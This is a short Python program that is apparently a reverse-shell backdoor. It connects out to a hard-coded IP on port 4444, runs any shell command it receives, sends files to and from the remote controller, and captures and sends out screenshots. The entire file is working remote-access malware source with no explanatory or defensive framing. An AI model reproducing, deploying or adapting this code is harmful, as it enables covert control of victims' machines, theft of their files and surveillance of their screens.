import socket
import json
import subprocess
import os
import pyautogui


def data_send(data):
    jsondata = json.dumps(data)
    soc.send(jsondata.encode())


def data_recv():
    data = ""
    while True:
        try:
            data = data + soc.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def upload_file(file):
    f = open(file, "rb")
    soc.send(f.read())


def download_file(file):
    f = open(file, "wb")
    soc.settimeout(3)
    chunk = soc.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = soc.recv(1024)
        except socket.timeout as e:
            break
    soc.settimeout(None)
    f.close()


def screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("screen.png")


def shell():
    while True:
        comm = data_recv()
        if comm == "exit:":
            break
        elif comm == "clear":
            pass
        elif comm[:3] == "cd ":
            os.chdir(comm[3:])
        elif comm[:7] == "upload":
            download_file(comm[7:])
        elif comm[:8] == "download":
            upload_file(comm[9:])
        elif comm[:10] == "screenshot":
            screenshot()
            upload_file("screen.png")
            os.remove("screen.png")
        elif comm == "help":
            pass
        else:
            exe = subprocess.Popen(
                comm, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            rcomm = exe.stdout.read() + exe.stderr.read()
            rcomm = rcomm.decode()
            data_send(rcomm)


soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.connect(("192.168.79.139", 4444))
shell()
